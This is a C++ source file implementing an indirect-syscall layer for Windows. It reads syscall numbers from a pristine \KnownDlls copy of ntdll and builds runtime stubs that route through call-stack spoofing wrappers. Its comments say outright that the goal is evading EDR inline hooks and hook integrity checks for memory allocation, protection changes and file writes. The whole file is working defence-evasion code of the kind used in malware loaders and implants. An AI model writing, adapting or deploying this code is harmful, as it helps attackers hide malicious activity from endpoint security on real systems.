// Indirect syscall layer - implementation
#include "syscalls.h"
#include "spoof.h"
#include <cstring>

typedef LONG(NTAPI* StubAllocVirt)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef LONG(NTAPI* StubProtectVirt)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef LONG(NTAPI* StubCreateFile)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
                                    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef LONG(NTAPI* StubWriteFile)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK,
                                   PVOID, ULONG, PLARGE_INTEGER, PULONG);
typedef LONG(NTAPI* StubClose)(HANDLE);
typedef LONG(NTAPI* StubOpenSection)(PHANDLE, ULONG, POBJECT_ATTRIBUTES);
typedef LONG(NTAPI* StubMapView)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
                                 PSIZE_T, ULONG, ULONG, ULONG);
typedef LONG(NTAPI* StubUnmapView)(HANDLE, PVOID);

static const char* kNames[] = {
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtCreateFile",
    "NtWriteFile",
    "NtClose",
    "NtOpenSection",
    "NtMapViewOfSection",
    "NtUnmapViewOfSection",
};
#define KNUM (sizeof(kNames) / sizeof(kNames[0]))

// total argument count per entry (used to derive stack-arg count)
static const DWORD kArgs[KNUM] = { 6, 5, 11, 9, 1, 3, 10, 2 };

struct SyscallEntry {
    DWORD number;
    PVOID syscall_instr;
    PVOID stub;
    PVOID spoof;
    DWORD tail_args;    // stack args (beyond the 4 register args)
    PDWORD slot_ssn;    // RW slot the stub reads the SSN from
    PVOID* slot_tgt;    // RW slot the stub reads the target from
};

static SyscallEntry g_entries[KNUM];

// ---------------------------------------------------------------------------
// Clean-copy resolution: instead of unhooking ntdll (which hook self-checks
// can detect), the SSN and the syscall-instruction RVA are read from a
// pristine copy of ntdll mapped from the \KnownDlls section object. The
// LIVE module is never written to, so nothing here can trigger a hook
// integrity check. The live `syscall` instruction itself is always intact
// under any sane inline hook (the EDR's own trampoline needs it).
// ---------------------------------------------------------------------------

static BYTE* g_clean_view = nullptr;      // mapped KnownDlls copy
static bool  g_clean_image_layout = false;
static HANDLE g_clean_section = nullptr;

// scan a pristine function prologue for (mov eax, imm32) and `syscall`
static bool scan_clean(const BYTE* fn, DWORD& num, DWORD& syscall_rva) {
    int limit = 0;
    while (limit < 128 && fn[limit] != 0xC3) limit++;
    if (limit >= 128) limit = 64;

    num = 0;
    syscall_rva = 0;
    for (int i = 0; i + 1 < limit; i++) {
        if (!num && fn[i] == 0xB8 && i + 4 < limit) {
            DWORD cand = *(DWORD*)(fn + i + 1);
            if (cand < 0x400) num = cand;
        }
        if (fn[i] == 0x0F && fn[i + 1] == 0x05) {
            syscall_rva = (DWORD)i;
            break;
        }
    }
    return num != 0 && syscall_rva != 0;
}

// convert an RVA (relative to the module base) into a pointer inside the
// clean view, accounting for raw-file vs image layout
static BYTE* clean_rva_to_ptr(DWORD rva) {
    if (!g_clean_view) return nullptr;
    if (g_clean_image_layout) return g_clean_view + rva;

    auto* dos = (IMAGE_DOS_HEADER*)g_clean_view;
    auto* nt = (IMAGE_NT_HEADERS*)(g_clean_view + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (rva >= sec[i].VirtualAddress &&
            rva < sec[i].VirtualAddress + sec[i].SizeOfRawData)
            return g_clean_view + (rva - sec[i].VirtualAddress) + sec[i].PointerToRawData;
    }
    return nullptr;
}

// maps \KnownDlls\ntdll.dll as a data view; returns true on success
static bool map_clean_ntdll() {
    if (g_clean_view) return true;

    static const wchar_t kName[] = L"\\KnownDlls\\ntdll.dll";
    UNICODE_STRING name{};
    name.Buffer = (PWSTR)kName;
    name.Length = (USHORT)(sizeof(kName) - sizeof(kName[0]));
    name.MaximumLength = (USHORT)sizeof(kName);
    OBJECT_ATTRIBUTES oa{};
    oa.Length = sizeof(oa);
    oa.ObjectName = &name;
    oa.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE sec = nullptr;
    if (sc::NtOpenSection(&sec, 0x4, &oa) < 0 || !sec) return false;

    PVOID view = nullptr;
    SIZE_T vs = 0;
    LONG st = sc::NtMapViewOfSection(sec, GetCurrentProcess(), &view, 0, 0, nullptr,
                                     &vs, 1, 0, PAGE_READONLY);
    if (st < 0 || !view) {           // informational statuses are successes
        sc::NtClose(sec);
        return false;
    }

    auto* dos = (IMAGE_DOS_HEADER*)view;
    auto* nt = dos->e_magic == IMAGE_DOS_SIGNATURE
        ? (IMAGE_NT_HEADERS*)((BYTE*)view + dos->e_lfanew) : nullptr;
    if (!nt || nt->Signature != IMAGE_NT_SIGNATURE) {
        sc::NtUnmapViewOfSection(GetCurrentProcess(), view);
        sc::NtClose(sec);
        return false;
    }

    // detect layout by comparing the .text start against live memory
    HMODULE live = GetModuleHandleA("ntdll");
    IMAGE_SECTION_HEADER* text = nullptr;
    IMAGE_SECTION_HEADER* secs = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
        if (memcmp(secs[i].Name, ".text", 5) == 0) { text = &secs[i]; break; }
    if (!text || !live) {
        sc::NtUnmapViewOfSection(GetCurrentProcess(), view);
        sc::NtClose(sec);
        return false;
    }

    BYTE* live_text = (BYTE*)live + text->VirtualAddress;
    BYTE* cand = (BYTE*)view + text->PointerToRawData;
    if (memcmp(cand, live_text, 32) != 0) {
        cand = (BYTE*)view + text->VirtualAddress;
        if (memcmp(cand, live_text, 32) != 0) {
            sc::NtUnmapViewOfSection(GetCurrentProcess(), view);
            sc::NtClose(sec);
            return false;
        }
        g_clean_image_layout = true;
    }

    g_clean_view = (BYTE*)view;
    g_clean_section = sec;
    return true;
}

static void release_clean_ntdll() {
    if (g_clean_view) sc::NtUnmapViewOfSection(GetCurrentProcess(), g_clean_view);
    if (g_clean_section) sc::NtClose(g_clean_section);
    g_clean_view = nullptr;
    g_clean_section = nullptr;
    g_clean_image_layout = false;
}

// Resolve the SSN and the live `syscall` instruction address for `name`.
// Prefers the pristine KnownDlls copy (immune to deep/prologue-overwriting
// hooks); falls back to scanning the live prologue.
static bool resolve(SyscallEntry& e, const char* name) {
    HMODULE live = GetModuleHandleA("ntdll");
    BYTE* fn = live ? (BYTE*)GetProcAddress(live, name) : nullptr;
    if (!fn) return false;

    if (g_clean_view) {
        BYTE* clean_fn = clean_rva_to_ptr((DWORD)(fn - (BYTE*)live));
        if (clean_fn) {
            DWORD num = 0, sys_rva = 0;
            if (scan_clean(clean_fn, num, sys_rva)) {
                e.number = num;
                e.syscall_instr = fn + sys_rva;
                return true;
            }
        }
    }

    // fallback: scan the live prologue (works under 5-byte E9 hooks)
    int limit = 0;
    while (limit < 128 && fn[limit] != 0xC3) limit++;
    if (limit >= 128) limit = 64;

    DWORD num = 0;
    PVOID sys_instr = nullptr;
    for (int i = 0; i + 1 < limit; i++) {
        if (!num && fn[i] == 0xB8 && i + 4 < limit) {
            DWORD cand = *(DWORD*)(fn + i + 1);
            if (cand < 0x400) num = cand;
        }
        if (fn[i] == 0x0F && fn[i + 1] == 0x05) {
            sys_instr = fn + i;
            break;
        }
    }
    if (!num || !sys_instr) return false;

    e.number = num;
    e.syscall_instr = sys_instr;
    return true;
}

// Runtime-built stub: endbr64 / mov r10, rcx / mov eax, [rip+ssn] /
// mov r11, [rip+tgt] / jmp r11. The SSN and the target are read from RW
// slots at CALL time, so they can be refreshed without ever rewriting
// executable memory (keeps the code page RX-only after finalize).
static void write_slots(SyscallEntry& e) {
    *e.slot_ssn = e.number;
    *e.slot_tgt = e.syscall_instr;
}

static bool build_stub(SyscallEntry& e) {
    BYTE* p = (BYTE*)spoof::carve_code(SYSCALL_STUB_SIZE);
    if (!p) return false;
    BYTE* slots = (BYTE*)spoof::carve_rw(16);
    if (!slots) return false;

    BYTE code[23] = {
        0xF3, 0x0F, 0x1E, 0xFA,                          // endbr64
        0x4C, 0x8B, 0xD1,                                  // mov r10, rcx
        0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,                // mov eax, [rip+ssn_slot]
        0x4C, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00,          // mov r11, [rip+tgt_slot]
        0x41, 0xFF, 0xE3                                   // jmp r11
    };
    *(DWORD*)(code + 9)  = (DWORD)(slots - (p + 13));       // disp32: rip after the mov eax
    *(DWORD*)(code + 16) = (DWORD)((slots + 8) - (p + 20)); // disp32: rip after the mov r11
    memcpy(p, code, sizeof(code));
    e.stub = p;
    e.slot_ssn = (PDWORD)slots;
    e.slot_tgt = (PVOID*)(slots + 8);
    write_slots(e);
    e.spoof = spoof::build_wrapper(e.stub, e.tail_args);
    return e.spoof != nullptr;
}

namespace sc {

bool init() {
    if (!spoof::init()) return false;
    for (DWORD i = 0; i < KNUM; i++) {
        g_entries[i].tail_args = kArgs[i] > 4 ? kArgs[i] - 4 : 0;
        if (!resolve(g_entries[i], kNames[i])) return false;
        if (!build_stub(g_entries[i])) return false;
    }
    // drop write permission on all generated code pages
    if (!spoof::finalize()) return false;

    // Self-check-safe refresh: re-resolve every SSN and `syscall` target
    // against the pristine \KnownDlls copy and update the RW stub slots.
    // Nothing here writes to ntdll, so hook self-checking EDRs see no
    // tampering. If the mapping fails, the live-scan values stay in effect.
    if (map_clean_ntdll()) {
        for (DWORD i = 0; i < KNUM; i++) {
            resolve(g_entries[i], kNames[i]);
            write_slots(g_entries[i]);
        }
        release_clean_ntdll();
    }
    return true;
}

LONG NtAllocateVirtualMemory(HANDLE h, PVOID* b, ULONG_PTR z, PSIZE_T s, ULONG at, ULONG pr) {
    return ((StubAllocVirt)g_entries[0].spoof)(h, b, z, s, at, pr);
}

LONG NtProtectVirtualMemory(HANDLE h, PVOID* b, PSIZE_T s, ULONG np, PULONG op) {
    return ((StubProtectVirt)g_entries[1].spoof)(h, b, s, np, op);
}

LONG NtCreateFile(PHANDLE fh, ULONG da, POBJECT_ATTRIBUTES oa, PIO_STATUS_BLOCK io,
                  PLARGE_INTEGER as, ULONG fa, ULONG sa, ULONG cd, ULONG co, PVOID eb, ULONG el) {
    return ((StubCreateFile)g_entries[2].spoof)(fh, da, oa, io, as, fa, sa, cd, co, eb, el);
}

LONG NtWriteFile(HANDLE fh, HANDLE ev, PVOID ar, PVOID ac, PIO_STATUS_BLOCK io,
                 PVOID buf, ULONG len, PLARGE_INTEGER off, PULONG key) {
    return ((StubWriteFile)g_entries[3].spoof)(fh, ev, ar, ac, io, buf, len, off, key);
}

LONG NtClose(HANDLE h) {
    return ((StubClose)g_entries[4].spoof)(h);
}

LONG NtOpenSection(PHANDLE sh, ULONG da, POBJECT_ATTRIBUTES oa) {
    return ((StubOpenSection)g_entries[5].spoof)(sh, da, oa);
}

LONG NtMapViewOfSection(HANDLE sh, HANDLE ph, PVOID* ba, ULONG_PTR zb, SIZE_T cs,
                        PLARGE_INTEGER so, PSIZE_T vs, ULONG id, ULONG at, ULONG wp) {
    return ((StubMapView)g_entries[6].spoof)(sh, ph, ba, zb, cs, so, vs, id, at, wp);
}

LONG NtUnmapViewOfSection(HANDLE ph, PVOID ba) {
    return ((StubUnmapView)g_entries[7].spoof)(ph, ba);
}

}
